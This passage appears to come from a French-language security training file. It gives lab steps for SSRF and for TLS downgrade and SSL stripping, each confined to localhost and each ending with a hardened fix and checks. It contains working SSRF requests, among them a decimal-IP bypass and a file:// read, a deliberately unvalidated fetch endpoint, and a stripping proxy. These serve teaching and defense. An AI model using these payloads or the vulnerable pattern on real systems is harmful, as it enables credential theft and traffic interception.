      goal: "Lancer un endpoint sensible sur localhost qui ne devrait jamais être atteint de l'extérieur.",
      explain:
        "On démarre un faux service interne sur 127.0.0.1:5000 qui imite des **metadata cloud** (rôle IAM + clés). C'est la cible que le SSRF va atteindre via le serveur vulnérable.\n\n**Cadre légal : cible de lab sur 127.0.0.1. Le SSRF ne se teste que sur les labs PortSwigger ou un scope de bug bounty écrit.**",
      target: "docker-bash",
      code: `cat > /tmp/metadata.py <<'PY'
from http.server import BaseHTTPRequestHandler, HTTPServer
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200); self.end_headers()
        self.wfile.write(b'{"Role":"app-role","AccessKeyId":"AKIA_FAKE","SecretAccessKey":"s3cr3t/INTERNAL"}')
    def log_message(self,*a): pass
HTTPServer(("127.0.0.1", 5000), H).serve_forever()
PY
python3 /tmp/metadata.py &
sleep 1
echo "service metadata interne sur 127.0.0.1:5000"`,
      expected: "« service metadata interne sur 127.0.0.1:5000 ». Le service sensible tourne.",
    },
    {
      n: 3,
      title: "Monter l'app vulnérable au SSRF",
      goal: "Lancer un endpoint /fetch qui va chercher n'importe quelle URL fournie.",
      explain:
        "On démarre l'app exposée (port 8080) avec le bug : elle récupère l'URL passée en paramètre `?url=` et la **fetch côté serveur**, sans aucune validation. C'est le point d'entrée de l'attaque.\n\n**Cadre légal : app cobaye dans ton conteneur isolé.**",
      target: "docker-bash",
      code: `cat > /tmp/ssrf_app.py <<'PY'
import urllib.request, urllib.parse
from http.server import BaseHTTPRequestHandler, HTTPServer
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        qs = urllib.parse.urlparse(self.path).query
        url = urllib.parse.parse_qs(qs).get("url", [""])[0]
        try:
            body = urllib.request.urlopen(url, timeout=3).read()  # BUG: URL non validee
        except Exception as e:
            body = ("ERR: " + str(e)).encode()
        self.send_response(200); self.end_headers(); self.wfile.write(body)
    def log_message(self,*a): pass
HTTPServer(("127.0.0.1", 8080), H).serve_forever()
PY
python3 /tmp/ssrf_app.py &
sleep 1
echo "app SSRF vulnerable sur 127.0.0.1:8080"`,
      expected: "« app SSRF vulnerable sur 127.0.0.1:8080 ». L'app fetch n'importe quelle URL.",
    },
    {
      n: 4,
      title: "Exploiter : voler les clés internes",
      goal: "Forcer l'app à fetcher le service metadata interne et exfiltrer les secrets.",
      explain:
        "On demande à l'app de fetcher `http://127.0.0.1:5000/`. Bien que ce service soit « interne », **le serveur** y a accès — et nous renvoie la réponse. On récupère ainsi les fausses clés IAM. C'est l'impact typique (cf. brèche Capital One 2019).\n\n**Cadre légal : exploitation contre TA cible de lab uniquement.**",
      target: "docker-bash",
      code: `echo "== SSRF vers le metadata interne =="
curl -s "http://127.0.0.1:8080/fetch?url=http://127.0.0.1:5000/"; echo
echo
echo "== bypass de filtre : 127.0.0.1 ecrit en decimal (2130706433) =="
curl -s "http://127.0.0.1:8080/fetch?url=http://2130706433:5000/"; echo`,
      expected:
        "Les deux requêtes renvoient « {\"Role\":\"app-role\",\"AccessKeyId\":\"AKIA_FAKE\",...} ». Le serveur a relayé les secrets internes, y compris via l'IP en décimal.",
    },
    {
      n: 5,
      title: "Variante : lecture de fichier via file://",
      goal: "Tester si l'app accepte des schemes non-HTTP pour lire un fichier local.",
      explain:
        "Si le client HTTP accepte `file://`, le SSRF devient une **lecture de fichier arbitraire**. On tente `file:///etc/passwd`. Selon la lib, ça lit le fichier — démonstration que ne pas restreindre les schemes élargit massivement l'impact.",
      target: "docker-bash",
      code: `echo "== SSRF avec scheme file:// =="
curl -s "http://127.0.0.1:8080/fetch?url=file:///etc/hostname" ; echo
echo "--- si le contenu du fichier s'affiche, file:// est exploitable ---"`,
      expected:
        "Le contenu de /etc/hostname (ou une erreur si urllib refuse file://). Si le fichier s'affiche, le scheme file:// est exploitable.",
    },
    {
      n: 6,
      title: "Corriger : allowlist + blocage des IP privées",
      goal: "Réécrire l'app pour résoudre l'URL, bloquer les IP réservées et limiter les schemes.",
      explain:
        "Défense en couches :\n1. **Schemes** limités à http/https.\n2. **Résoudre le hostname**, puis **rejeter** toute IP privée/réservée (`127.0.0.0/8`, `10/8`, `172.16/12`, `192.168/16`, `169.254/16`, `::1`).\n3. Idéalement une **allowlist** de domaines, et re-vérifier l'IP au moment du fetch (anti rebinding).\n\nOn code la version durcie avec le module `ipaddress` pour classer l'IP résolue.",
      target: "docker-bash",
      code: `cat > /tmp/ssrf_safe.py <<'PY'
import urllib.request, urllib.parse, socket, ipaddress
from http.server import BaseHTTPRequestHandler, HTTPServer

def safe(url):
    p = urllib.parse.urlparse(url)
    if p.scheme not in ("http", "https"):
        return None, "scheme interdit"
    host = p.hostname
    try:
        ip = ipaddress.ip_address(socket.gethostbyname(host))
    except Exception as e:
        return None, "resolution echouee: " + str(e)
    if ip.is_private or ip.is_loopback or ip.is_link_local or ip.is_reserved:
        return None, "IP reservee bloquee: " + str(ip)
    return ip, None

class H(BaseHTTPRequestHandler):
    def do_GET(self):
        url = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query).get("url",[""])[0]
        ip, err = safe(url)
        if err:
            self.send_response(403); self.end_headers(); self.wfile.write(b"BLOQUE: "+err.encode()); return
        try:
            body = urllib.request.urlopen(url, timeout=3).read()
        except Exception as e:
            body = ("ERR: "+str(e)).encode()
        self.send_response(200); self.end_headers(); self.wfile.write(body)
    def log_message(self,*a): pass

HTTPServer(("127.0.0.1", 8081), H).serve_forever()
PY
python3 /tmp/ssrf_safe.py &
sleep 1
echo "app SSRF durcie sur 127.0.0.1:8081"`,
      expected: "« app SSRF durcie sur 127.0.0.1:8081 ». L'app valide schemes et IP.",
    },
    {
      n: 7,
      title: "Vérifier : SSRF interne bloqué",
      goal: "Rejouer tous les vecteurs contre l'app durcie et confirmer le rejet.",
      explain:
        "On rejoue les attaques de l'étape 4-5 contre l'app durcie : metadata interne, IP en décimal, et `file://`. Tous doivent renvoyer **BLOQUE** (403). L'attaquant ne peut plus atteindre le réseau interne ni lire de fichier. (En complément réel : IMDSv2, egress filtering, proxy de sortie avec allowlist.)",
      target: "docker-bash",
      code: `echo "1) metadata interne :"
curl -s "http://127.0.0.1:8081/fetch?url=http://127.0.0.1:5000/"; echo
echo "2) bypass IP decimale :"
curl -s "http://127.0.0.1:8081/fetch?url=http://2130706433:5000/"; echo
echo "3) scheme file:// :"
curl -s "http://127.0.0.1:8081/fetch?url=file:///etc/hostname"; echo`,
      expected:
        "1) « BLOQUE: IP reservee bloquee: 127.0.0.1 ». 2) idem (l'IP décimale résout vers 127.0.0.1). 3) « BLOQUE: scheme interdit ». Tous les vecteurs sont neutralisés.",
    },
  ],

  // ============================================================
  // TLS Downgrade & SSL Stripping
  // ============================================================
  "tls-downgrade": [
    {
      n: 1,
      title: "Attaquer la mise en place, pas le chiffrement",
      goal: "Comprendre que le downgrade vise la négociation TLS et la bascule HTTP→HTTPS.",
      explain:
        "Plutôt que casser le chiffrement (dur), l'attaquant en position MITM s'attaque à sa **mise en place**.\n\n- **SSL stripping** (Moxie Marlinspike) : l'utilisateur tape `site.com` → requête **HTTP** par défaut. Le MITM intercepte la redirection vers HTTPS, garde une connexion **HTTPS avec le serveur** mais sert la page en **HTTP clair à la victime**. Cookies et mot de passe transitent en clair.\n- **Downgrade de version/cipher** : forcer SSLv3/TLS 1.0 ou des suites faibles (export, RC4) → POODLE, FREAK, Logjam, BEAST. Un serveur qui accepte encore ces versions est complice.\n\nLa parade clé : **HSTS** (le navigateur refuse le HTTP) + désactiver les vieilles versions/suites.",
      target: "read",
    },
    {
      n: 2,
      title: "Cartographier les versions/ciphers acceptés",
      goal: "Monter un serveur TLS et énumérer ce qu'il accepte avec openssl.",
      explain:
        "Avant tout downgrade, l'attaquant (ou l'auditeur) **énumère** : quelles versions de protocole et quelles suites le serveur accepte-t-il ? On démarre un serveur TLS local puis on l'interroge avec `openssl s_client`. Plus la surface est large (vieilles versions, suites faibles), plus le downgrade est possible.",
      target: "docker-bash",
      code: `openssl req -x509 -newkey rsa:2048 -keyout /tmp/dk.pem -out /tmp/dc.pem -days 1 -nodes -subj "/CN=localhost" 2>/dev/null
cat > /tmp/dtls.py <<'PY'
import http.server, ssl
ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
ctx.load_cert_chain("/tmp/dc.pem", "/tmp/dk.pem")
# serveur permissif : laisse openssl negocier ce qu'il peut
class Hd(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200); self.end_headers(); self.wfile.write(b"hello over TLS")
    def log_message(self,*a): pass
httpd = http.server.HTTPServer(("127.0.0.1", 7443), Hd)
httpd.socket = ctx.wrap_socket(httpd.socket, server_side=True)
httpd.serve_forever()
PY
python3 /tmp/dtls.py &
sleep 1
echo "== version negociee par defaut =="
echo | openssl s_client -connect 127.0.0.1:7443 2>/dev/null | grep -E "Protocol|Cipher" | head -4`,
      expected:
        "openssl affiche le protocole et le cipher négociés (ex. « Protocol : TLSv1.3 », « Cipher : TLS_AES_256... »). C'est la base de référence avant tentative de downgrade.",
    },
    {
      n: 3,
      title: "Tenter un downgrade de version",
      goal: "Forcer openssl à proposer une vieille version (TLS 1.0) et voir si le serveur l'accepte.",
      explain:
        "Le downgrade consiste à **proposer une version faible** dans le ClientHello et voir si le serveur l'accepte. On force `openssl s_client` à n'offrir que TLS 1.0 (`-tls1`). Si la poignée de main réussit, le serveur est vulnérable au downgrade ; si elle échoue, il refuse les vieilles versions.\n\n**Cadre légal : sonde contre TON serveur de lab uniquement.**",
      target: "docker-bash",
      code: `echo "== tentative TLS 1.0 (-tls1) =="
echo | openssl s_client -connect 127.0.0.1:7443 -tls1 2>&1 | grep -iE "protocol|handshake|alert|error" | head -5
echo
echo "== tentative TLS 1.1 (-tls1_1) =="
echo | openssl s_client -connect 127.0.0.1:7443 -tls1_1 2>&1 | grep -iE "protocol|handshake|alert|error" | head -5`,
      expected:
        "Selon l'OpenSSL du conteneur : soit la poignée échoue (« no protocols available » / alert) car les vieilles versions sont désactivées par défaut — c'est le bon signe — soit elle réussit et révèle l'acceptation de TLS 1.0/1.1.",
    },
    {
      n: 4,
      title: "Simuler le SSL stripping",
      goal: "Reproduire un proxy HTTP clair qui se place devant un backend HTTPS.",
      explain:
        "On reproduit le cœur du SSL stripping : un proxy qui parle **HTTP clair côté victime** mais relaie vers le **backend HTTPS**. La victime croit naviguer normalement, mais tout passe en clair sur son segment. On lance le proxy et on s'y connecte en HTTP simple.\n\n**Cadre légal : interception de trafic → uniquement TES cibles de lab (127.0.0.1).**",
      target: "docker-bash",
      code: `cat > /tmp/sslstrip.py <<'PY'
import http.server, urllib.request, ssl
ctx = ssl._create_unverified_context()
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        # victime parle HTTP clair; le proxy relaie vers le backend HTTPS
        data = urllib.request.urlopen("https://127.0.0.1:7443/", context=ctx, timeout=3).read()
        print("[sslstrip] relaye en CLAIR vers la victime:", data)
        self.send_response(200); self.end_headers(); self.wfile.write(data)
    def log_message(self,*a): pass
http.server.HTTPServer(("127.0.0.1", 7080), H).serve_forever()
PY
python3 /tmp/sslstrip.py &
sleep 1
echo "== victime navigue en HTTP clair (sans s) =="
curl -s http://127.0.0.1:7080/; echo
echo "--- le contenu HTTPS du backend a ete servi en clair a la victime ---"`,
      expected:
        "La victime reçoit « hello over TLS » via **HTTP clair** (port 7080), et le proxy logge le relais. Le chiffrement du backend est contourné côté victime.",
    },
    {
      n: 5,
      title: "Corriger : HSTS + versions minimales",
      goal: "Monter un serveur qui impose HSTS et refuse les protocoles faibles.",
      explain:
        "Défenses :\n1. **HSTS** (`Strict-Transport-Security`) : après une 1re visite, le navigateur **refuse le HTTP** pour ce domaine → sslstrip ne peut plus rétrograder (et la preload list protège dès la 1re visite).\n2. **TLS 1.2 minimum** (idéalement 1.3) : on désactive SSLv3 / TLS 1.0 / 1.1.\n3. Redirection 301 HTTP→HTTPS, cookies `Secure`.\n\nOn monte un serveur TLS avec `minimum_version = TLSv1_2` et l'en-tête HSTS.",
      target: "docker-bash",
      code: `cat > /tmp/tls_safe.py <<'PY'
import http.server, ssl
ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
ctx.minimum_version = ssl.TLSVersion.TLSv1_2   # refuse < TLS 1.2
ctx.load_cert_chain("/tmp/dc.pem", "/tmp/dk.pem")
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Strict-Transport-Security", "max-age=63072000; includeSubDomains; preload")
        self.end_headers(); self.wfile.write(b"hello secure")
    def log_message(self,*a): pass
httpd = http.server.HTTPServer(("127.0.0.1", 7444), H)
httpd.socket = ctx.wrap_socket(httpd.socket, server_side=True)
httpd.serve_forever()
PY
python3 /tmp/tls_safe.py &
sleep 1
echo "serveur TLS durci (>= TLS1.2 + HSTS) sur 127.0.0.1:7444"`,
      expected: "« serveur TLS durci (>= TLS1.2 + HSTS) sur 127.0.0.1:7444 ». Le serveur impose TLS 1.2+ et HSTS.",
    },
    {
      n: 6,
      title: "Vérifier : downgrade refusé + HSTS présent",
      goal: "Confirmer que TLS 1.0/1.1 sont rejetés et que l'en-tête HSTS est servi.",
      explain:
        "Trois vérifications contre le serveur durci :\n1. Tentative TLS 1.0/1.1 → **échec** de poignée (downgrade refusé).\n2. Connexion normale → réussite en TLS 1.2/1.3.\n3. Présence de l'en-tête `Strict-Transport-Security` (qui aurait empêché le sslstrip de l'étape 4). Le couple « versions minimales + HSTS » ferme la fenêtre de downgrade.",
      target: "docker-bash",
      code: `echo "1) downgrade TLS 1.0 -> doit ECHOUER :"
echo | openssl s_client -connect 127.0.0.1:7444 -tls1 2>&1 | grep -iE "alert|no protocol|handshake fail|error" | head -2
echo "2) connexion normale -> version negociee :"
echo | openssl s_client -connect 127.0.0.1:7444 2>/dev/null | grep -E "Protocol" | head -1
echo "3) en-tete HSTS present :"
curl -sk -I https://127.0.0.1:7444/ | grep -i strict-transport-security`,
      expected:
        "1) une alerte / « no protocols available » → TLS 1.0 refusé. 2) « Protocol : TLSv1.2 » ou TLSv1.3. 3) « strict-transport-security: max-age=63072000; ... ». Downgrade et stripping neutralisés.",
    },
  ],
};
